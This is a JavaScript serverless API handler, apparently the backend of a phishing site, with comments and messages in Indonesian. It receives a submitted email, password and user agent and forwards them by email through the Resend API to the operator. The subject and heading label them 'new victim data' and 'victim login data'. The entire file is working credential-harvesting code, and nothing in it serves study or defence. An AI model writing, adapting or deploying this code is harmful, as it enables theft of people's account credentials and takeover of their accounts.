export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password, userAgent } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email dan password wajib' });
    }

    const RESEND_API_KEY = process.env.RESEND_API_KEY;
    const YOUR_EMAIL = process.env.TO_EMAIL;

    if (!RESEND_API_KEY) {
        return res.status(500).json({ error: 'API key belum diset di env' });
    }

    try {
        const response = await fetch('https://api.resend.com/emails', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + RESEND_API_KEY,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                from: 'onboarding@resend.dev',
                to: YOUR_EMAIL,
                subject: '🎯 DATA KORBAN BARU - ' + new Date().toLocaleString('id-ID'),
                html: `
                    <div style="font-family:Arial,sans-serif;padding:20px;background:#f5f5f5;">
                        <div style="max-width:500px;margin:0 auto;background:#fff;border-radius:10px;padding:24px;border:1px solid #e0e0e0;">
                            <h2 style="color:#1a73e8;margin:0 0 16px;">Data Login Korban</h2>
                            <table style="width:100%;border-collapse:collapse;">
                                <tr>
                                    <td style="padding:8px 0;font-weight:bold;color:#555;width:120px;">Email:</td>
                                    <td style="padding:8px 0;color:#111;">${email}</td>
                                </tr>
                                <tr>
                                    <td style="padding:8px 0;font-weight:bold;color:#555;">Password:</td>
                                    <td style="padding:8px 0;color:#111;">${password}</td>
                                </tr>
                                <tr>
                                    <td style="padding:8px 0;font-weight:bold;color:#555;">Waktu:</td>
                                    <td style="padding:8px 0;color:#111;">${new Date().toLocaleString('id-ID')}</td>
                                </tr>
                                <tr>
                                    <td style="padding:8px 0;font-weight:bold;color:#555;">User Agent:</td>
                                    <td style="padding:8px 0;color:#111;font-size:12px;">${userAgent || '-'}</td>
                                </tr>
                            </table>
                        </div>
                    </div>
                `
            })
        });

        const data = await response.json();
        console.log('RESEND STATUS:', response.status);
        console.log('RESEND BODY:', JSON.stringify(data));

        if (!response.ok) {
            return res.status(response.status).json({ error: data.message || 'Gagal kirim' });
        }

        return res.status(200).json({ success: true, data });
    } catch (err) {
        console.log('FETCH ERROR:', err.message);
        return res.status(500).json({ error: err.message });
    }
}
